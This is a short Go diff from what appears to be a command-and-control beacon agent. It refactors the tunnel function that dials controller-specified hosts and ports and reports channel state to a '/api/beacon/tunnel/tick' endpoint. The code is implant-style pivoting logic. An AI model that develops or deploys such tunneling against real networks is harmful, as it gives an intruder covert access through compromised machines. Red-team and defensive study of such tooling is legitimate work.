@@ -4659,7 +4659,7 @@ func _tunnelTick() {
 \t\tcase "open":
 \t\t\thost, _ := item["host"].(string); portF, _ := item["port"].(float64)
 \t\t\tconn, err := net.DialTimeout("tcp", fmt.Sprintf("%s:%d", host, int(portF)), 10*time.Second)
-\t\t\tif err != nil { _post("/api/beacon/tunnel/tick", map[string]interface{}{"agent_id": _agentID, "items": []map[string]interface{}{{"channel_id": cid, "data": "", "closed": true}}}); continue }
+\t\t\tif err != nil { _ci := map[string]interface{}{"channel_id": cid, "data": "", "closed": true}; _post("/api/beacon/tunnel/tick", map[string]interface{}{"agent_id": _agentID, "items": []map[string]interface{}{_ci}}); continue }
 \t\t\t_tnlMu.Lock(); _tnl[cid] = &_tnlCh{conn: conn}; _tnlMu.Unlock()
 \t\tcase "data":
 \t\t\t_tnlMu.Lock(); ch := _tnl[cid]; _tnlMu.Unlock()
